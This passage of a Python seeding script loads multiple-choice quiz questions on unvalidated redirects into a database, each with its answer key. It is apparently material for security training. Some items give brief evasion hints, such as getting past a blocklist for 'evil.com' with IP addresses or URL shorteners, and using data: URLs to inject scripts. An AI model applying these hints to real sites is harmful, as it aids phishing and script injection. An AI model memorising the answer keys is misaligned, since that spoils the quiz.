                "text": "How can you bypass a blacklist that blocks 'evil.com'?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Hard",
                "skill_focus": "Evasion",
                "explanation": "Using a sub-domain, IP address, or URL shortener.",
                "options": [
                    {"text": "You can't", "is_correct": False},
                    {"text": "Using IP addresses or URL shorteners", "is_correct": True},
                    {"text": "Capitalizing EVIL.COM", "is_correct": False},
                    {"text": "Adding a space", "is_correct": False}
                ]
            },
            {
                "text": "Does an 'Unvalidated Redirect' allow access to server files?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Easy",
                "skill_focus": "Knowledge",
                "explanation": "No, it's a client-side navigation issue, not server-side access.",
                "options": [
                    {"text": "Yes, if using file://", "is_correct": False},
                    {"text": "Generally no, it targets the user's browser", "is_correct": True},
                    {"text": "Only for admins", "is_correct": False},
                    {"text": "Yes, it is like LFI", "is_correct": False}
                ]
            },
            {
                "text": "Which of these is a secure alternative to generic redirects?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Medium",
                "skill_focus": "Prevention",
                "explanation": "Using a middle page ('You are leaving this site') to inform the user.",
                "options": [
                    {"text": "Using more redirects", "is_correct": False},
                    {"text": "Using an intermediate warning page", "is_correct": True},
                    {"text": "Hiding the destination", "is_correct": False},
                    {"text": "Not using redirects", "is_correct": False}
                ]
            },
            {
                "text": "Redirects to `data:` URLs can be used for...?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Hard",
                "skill_focus": "Exploitation",
                "explanation": "Serving malicious HTML or scripts directly from the URL.",
                "options": [
                    {"text": "Downloading data", "is_correct": False},
                    {"text": "Injecting malicious content/scripts", "is_correct": True},
                    {"text": "Encrypting the browser", "is_correct": False},
                    {"text": "None", "is_correct": False}
                ]
            },
            {
                "text": "What is the 'Referer' header's role in redirects?",
                "type": "multiple_choice",
                "topic": "Unvalidated Redirect",
                "difficulty": "Hard",
                "skill_focus": "Knowledge",
                "explanation": "It tells the target site where the user came from, potentially leaking info if redirect is insecure.",
                "options": [
                    {"text": "Bypassing the redirect", "is_correct": False},
                    {"text": "Tells the destination where the user originated", "is_correct": True},
                    {"text": "Changes the URL", "is_correct": False},
                    {"text": "Authenticates the user", "is_correct": False}
                ]
            },
        ]

        for q_data in questions_data:
            options_data = q_data.pop("options")
            question = models.Question(**q_data)
            db.add(question)
            db.commit()
            db.refresh(question)
            
            for opt_data in options_data:
                option = models.QuestionOption(**opt_data, question_id=question.id)
                db.add(option)
            db.commit()
            
        logger.info(f"Successfully seeded {len(questions_data)} questions.")
        
    except Exception as e:
        logger.error(f"Error seeding database: {e}")
        db.rollback()
    finally:
        db.close()

if __name__ == "__main__":
    seed_data()
